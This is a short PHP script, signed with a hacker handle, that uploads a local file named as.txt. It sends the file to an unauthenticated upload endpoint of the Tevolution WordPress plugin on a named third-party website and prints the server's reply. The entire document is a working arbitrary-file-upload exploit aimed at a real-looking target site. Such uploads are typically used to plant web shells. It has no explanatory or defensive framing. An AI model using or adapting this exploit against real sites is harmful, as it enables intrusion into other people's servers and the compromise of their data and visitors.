<?php
$uploadfile="as.txt"; ///xBADGIRL21 ! Removing my name Doesn't mean you are the Founder or Owner of this ^_^
$ch = curl_init("http://www.diaocngaynay.vn/wp-content/plugins/Tevolution/tmplconnector/monetize/templatic-custom_fields/single-upload.php");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS,
array('file'=>"@$uploadfile"));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$postResult = curl_exec($ch);
curl_close($ch);
print "$postResult";
?> 